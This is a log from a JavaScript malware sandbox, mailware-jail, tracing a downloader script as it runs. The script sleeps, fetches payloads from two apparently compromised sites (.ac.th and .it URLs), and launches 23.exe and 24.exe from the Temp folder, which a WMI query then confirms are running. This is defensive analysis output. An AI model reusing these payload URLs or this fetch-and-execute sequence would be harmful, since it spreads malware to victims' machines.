17 Apr 01:07:52 - mailware-jail, a malware sandbox ver. 0.19
17 Apr 01:07:52 - ------------------------
17 Apr 01:07:52 - Arguments: --down malware/20161013/_TMP__XipXkrLd.js -s malware/20161013/out/
17 Apr 01:07:52 - Sandbox environment sequence: env/utils.js,env/eval.js,env/function.js,env/wscript.js,env/browser.js,env/agents.js,env/other.js,env/console.js
17 Apr 01:07:52 - Malware files: malware/20161013/_TMP__XipXkrLd.js
17 Apr 01:07:52 - Execution timeout set to: 60 seconds
17 Apr 01:07:52 - Output file for sandbox dump: sandbox_dump_after.json
17 Apr 01:07:52 - Output directory for generated files: malware/20161013/out/
17 Apr 01:07:52 - Download from remote server: Yes
17 Apr 01:07:52 - ==> Preparing Sandbox environment.
17 Apr 01:07:52 -  => Executing: env/utils.js quitely
17 Apr 01:07:52 -  => Executing: env/eval.js quitely
17 Apr 01:07:52 -  => Executing: env/function.js quitely
17 Apr 01:07:52 -  => Executing: env/wscript.js quitely
17 Apr 01:07:52 -  => Executing: env/browser.js quitely
17 Apr 01:07:52 -  => Executing: env/agents.js quitely
17 Apr 01:07:52 -  => Executing: env/other.js quitely
17 Apr 01:07:52 -  => Executing: env/console.js quitely
17 Apr 01:07:52 - ==> Executing malware file(s). =========================================
17 Apr 01:07:52 -  => Executing: malware/20161013/_TMP__XipXkrLd.js verbosely, reporting silent catches
17 Apr 01:07:52 - Saving: malware/20161013/out/malware_20161013__TMP__XipXkrLd.js
17 Apr 01:07:52 - Saving: malware/20161013/out/tr_malware_20161013__TMP__XipXkrLd.js
17 Apr 01:07:52 - WScript.scriptfullname = (string) 'malware/20161013/_TMP__XipXkrLd.js'
17 Apr 01:07:52 - WScript.arguments = (object) 'malware/20161013/_TMP__XipXkrLd.js,xyz'
17 Apr 01:07:52 - WScript.Sleep(500)
17 Apr 01:07:52 - WScript.Sleep(500)
17 Apr 01:07:53 - WScript.Sleep(500)
17 Apr 01:07:53 - WScript.Sleep(500)
17 Apr 01:07:54 - WScript.Sleep(500)
17 Apr 01:07:54 - WScript.Sleep(500)
17 Apr 01:07:55 - WScript.Sleep(500)
17 Apr 01:07:55 - WScript.Sleep(500)
17 Apr 01:07:56 - WScript.Sleep(500)
17 Apr 01:07:56 - WScript.Sleep(500)
17 Apr 01:07:57 - WScript.Sleep(500)
17 Apr 01:07:57 - WScript.Sleep(500)
17 Apr 01:07:58 - ActiveXObject(WScript.Shell)
17 Apr 01:07:58 - new WScript.Shell[14]
17 Apr 01:07:58 - WScript.Shell[14].ExpandEnvironmentStrings(%TMP%) => C:\Users\User\AppData\Local\Temp
17 Apr 01:07:58 - ActiveXObject(MSXML2.XMLHTTP)
17 Apr 01:07:58 - new MSXML2.XMLHTTP[15]
17 Apr 01:07:58 - MSXML2.XMLHTTP[15].onreadystatechange = (undefined) 'undefined'
17 Apr 01:07:58 - MSXML2.XMLHTTP[15].open(GET,http://lcbschool2.ac.th/pic/_notes/logs.php,false)
17 Apr 01:07:58 - MSXML2.XMLHTTP[15].method = (string) 'GET'
17 Apr 01:07:58 - MSXML2.XMLHTTP[15].url = (string) 'http://lcbschool2.ac.th/pic/_notes/logs.php'
17 Apr 01:07:58 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
17 Apr 01:07:58 - MSXML2.XMLHTTP[15].setRequestHeader(User-Agent, Python-urllib/3.1)
17 Apr 01:07:58 - MSXML2.XMLHTTP[15].send(undefined)
17 Apr 01:07:58 - MSXML2.XMLHTTP[15].method.get() => (string) 'GET'
17 Apr 01:07:58 - MSXML2.XMLHTTP[15].url.get() => (string) 'http://lcbschool2.ac.th/pic/_notes/logs.php'
17 Apr 01:07:58 - MSXML2.XMLHTTP[15].status = (number) '404'
17 Apr 01:07:58 - MSXML2.XMLHTTP[15].readystate = (number) '4'
17 Apr 01:07:58 - MSXML2.XMLHTTP[15].statustext = (string) 'OK'
17 Apr 01:07:58 - MSXML2.XMLHTTP[15].responsebody = (object) '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">?<html><head>?<title>404 Not Found</title>?</head><body>?<h1>Not Found</h1>?<p>The requested URL /pic/_notes/logs.php was not found on this server.</p>?<p>Additionally, a 404 Not Found?error was encou ... (truncated)'
17 Apr 01:07:58 - MSXML2.XMLHTTP[15].allresponseheaders = (string) '{"date":"Mon, 16 Apr 2018 23:07:58 GMT","server":"Apache/2","content-length":"336","connection":"close","content-type":"text/html; charset=iso-8859-1"}'
17 Apr 01:07:58 - MSXML2.XMLHTTP[15].status.get() => (number) '404'
17 Apr 01:07:58 - MSXML2.XMLHTTP[15].allresponseheaders.get() => (string) '{"date":"Mon, 16 Apr 2018 23:07:58 GMT","server":"Apache/2","content-length":"336","connection":"close","content-type":"text/html; charset=iso-8859-1"}'
17 Apr 01:07:58 - MSXML2.XMLHTTP[15].responsebody.get() => (object) '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">?<html><head>?<title>404 Not Found</title>?</head><body>?<h1>Not Found</h1>?<p>The requested URL /pic/_notes/logs.php was not found on this server.</p>?<p>Additionally, a 404 Not Found?error was encou ... (truncated)'
17 Apr 01:07:58 - MSXML2.XMLHTTP[15].statustext.get() => (string) 'OK'
17 Apr 01:07:58 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
17 Apr 01:07:58 - MSXML2.XMLHTTP[15].status.get() => (number) '404'
17 Apr 01:07:58 - WScript.Shell[14].Run(C:\Users\User\AppData\Local\Temp\23.exe, 1, 0)
17 Apr 01:07:58 - GetObject(winmgmts:{impersonationLevel=impersonate}, undefined)
17 Apr 01:07:58 - new AutomationObject[16](winmgmts:{impersonationLevel=impersonate}, undefined)
17 Apr 01:07:58 - new Process[17](app.exe)
17 Apr 01:07:58 - Process[17](app.exe).processid = (number) '17'
17 Apr 01:07:58 - Process[17](app.exe).name = (string) 'app.exe'
17 Apr 01:07:58 - Process[17](app.exe).commandline = (string) 'app.exe'
17 Apr 01:07:58 - new TextStream[18]
17 Apr 01:07:58 - Process[17](app.exe).stdout = (object) 'TextStream[18]'
17 Apr 01:07:58 - new TextStream[19]
17 Apr 01:07:58 - Process[17](app.exe).stderr = (object) 'TextStream[19]'
17 Apr 01:07:58 - new TextStream[20]
17 Apr 01:07:58 - Process[17](app.exe).stdin = (object) 'TextStream[20]'
17 Apr 01:07:58 - new Collection[21]([ Process {?    id: 17,?    _name: 'Process[17](app.exe)',?    _processid: 17,?    _exitcode: '',?    _status: '',?    _stdout: TextStream[18],?    _stdin: TextStream[20],?    _stderr: TextStream[19],?    _commandline: 'app.exe',?    _processname: 'a ... (truncated))
17 Apr 01:07:58 - Collection[21].count = (number) '1'
17 Apr 01:07:58 - AutomationObject[16](winmgmts:{impersonationLevel=impersonate}, undefined).ExecQuery(Select * from Win32_Process Where Name = '23.exe') => Collection[21]
17 Apr 01:07:58 - Collection[21].count.get() => (number) '1'
17 Apr 01:07:58 - ActiveXObject(WScript.Shell)
17 Apr 01:07:58 - new WScript.Shell[22]
17 Apr 01:07:58 - WScript.Shell[22].ExpandEnvironmentStrings(%TMP%) => C:\Users\User\AppData\Local\Temp
17 Apr 01:07:58 - ActiveXObject(MSXML2.XMLHTTP)
17 Apr 01:07:58 - new MSXML2.XMLHTTP[23]
17 Apr 01:07:58 - MSXML2.XMLHTTP[23].onreadystatechange = (undefined) 'undefined'
17 Apr 01:07:58 - MSXML2.XMLHTTP[23].open(GET,http://masseriacarparelli.it/logs2.php,false)
17 Apr 01:07:58 - MSXML2.XMLHTTP[23].method = (string) 'GET'
17 Apr 01:07:58 - MSXML2.XMLHTTP[23].url = (string) 'http://masseriacarparelli.it/logs2.php'
17 Apr 01:07:58 - MSXML2.XMLHTTP[23].async = (boolean) 'false'
17 Apr 01:07:58 - MSXML2.XMLHTTP[23].setRequestHeader(User-Agent, Python-urllib/3.1)
17 Apr 01:07:58 - MSXML2.XMLHTTP[23].send(undefined)
17 Apr 01:07:58 - MSXML2.XMLHTTP[23].method.get() => (string) 'GET'
17 Apr 01:07:58 - MSXML2.XMLHTTP[23].url.get() => (string) 'http://masseriacarparelli.it/logs2.php'
17 Apr 01:07:59 - MSXML2.XMLHTTP[23].status = (number) '404'
17 Apr 01:07:59 - MSXML2.XMLHTTP[23].readystate = (number) '4'
17 Apr 01:07:59 - MSXML2.XMLHTTP[23].statustext = (string) 'OK'
17 Apr 01:07:59 - MSXML2.XMLHTTP[23].responsebody = (object) '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">?<html><head>?<title>404 Not Found</title>?</head><body>?<h1>Not Found</h1>?<p>The requested URL /logs2.php was not found on this server.</p>?</body></html>?'
17 Apr 01:07:59 - MSXML2.XMLHTTP[23].allresponseheaders = (string) '{"date":"Mon, 16 Apr 2018 23:07:59 GMT","server":"Apache","content-length":"207","connection":"close","content-type":"text/html; charset=iso-8859-1"}'
17 Apr 01:07:59 - MSXML2.XMLHTTP[23].status.get() => (number) '404'
17 Apr 01:07:59 - MSXML2.XMLHTTP[23].allresponseheaders.get() => (string) '{"date":"Mon, 16 Apr 2018 23:07:59 GMT","server":"Apache","content-length":"207","connection":"close","content-type":"text/html; charset=iso-8859-1"}'
17 Apr 01:07:59 - MSXML2.XMLHTTP[23].responsebody.get() => (object) '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">?<html><head>?<title>404 Not Found</title>?</head><body>?<h1>Not Found</h1>?<p>The requested URL /logs2.php was not found on this server.</p>?</body></html>?'
17 Apr 01:07:59 - MSXML2.XMLHTTP[23].statustext.get() => (string) 'OK'
17 Apr 01:07:59 - MSXML2.XMLHTTP[23].onreadystatechange.get() => (undefined) 'undefined'
17 Apr 01:07:59 - MSXML2.XMLHTTP[23].status.get() => (number) '404'
17 Apr 01:07:59 - WScript.Shell[22].Run(C:\Users\User\AppData\Local\Temp\24.exe, 1, 0)
17 Apr 01:07:59 - GetObject(winmgmts:{impersonationLevel=impersonate}, undefined)
17 Apr 01:07:59 - new AutomationObject[24](winmgmts:{impersonationLevel=impersonate}, undefined)
17 Apr 01:07:59 - new Process[25](app.exe)
17 Apr 01:07:59 - Process[25](app.exe).processid = (number) '25'
17 Apr 01:07:59 - Process[25](app.exe).name = (string) 'app.exe'
17 Apr 01:07:59 - Process[25](app.exe).commandline = (string) 'app.exe'
17 Apr 01:07:59 - new TextStream[26]
17 Apr 01:07:59 - Process[25](app.exe).stdout = (object) 'TextStream[26]'
17 Apr 01:07:59 - new TextStream[27]
17 Apr 01:07:59 - Process[25](app.exe).stderr = (object) 'TextStream[27]'
17 Apr 01:07:59 - new TextStream[28]
17 Apr 01:07:59 - Process[25](app.exe).stdin = (object) 'TextStream[28]'
17 Apr 01:07:59 - new Collection[29]([ Process {?    id: 25,?    _name: 'Process[25](app.exe)',?    _processid: 25,?    _exitcode: '',?    _status: '',?    _stdout: TextStream[26],?    _stdin: TextStream[28],?    _stderr: TextStream[27],?    _commandline: 'app.exe',?    _processname: 'a ... (truncated))
17 Apr 01:07:59 - Collection[29].count = (number) '1'
17 Apr 01:07:59 - AutomationObject[24](winmgmts:{impersonationLevel=impersonate}, undefined).ExecQuery(Select * from Win32_Process Where Name = '24.exe') => Collection[29]
17 Apr 01:07:59 - Collection[29].count.get() => (number) '1'
17 Apr 01:07:59 - ==> Cleaning up sandbox.
17 Apr 01:07:59 - ==> Script execution finished, dumping sandbox environment to a file.
17 Apr 01:07:59 - The sandbox context has been  saved to: sandbox_dump_after.json
17 Apr 01:07:59 - Saving: malware/20161013/out/urls.json
17 Apr 01:07:59 - Saving: malware/20161013/out/wmis.json
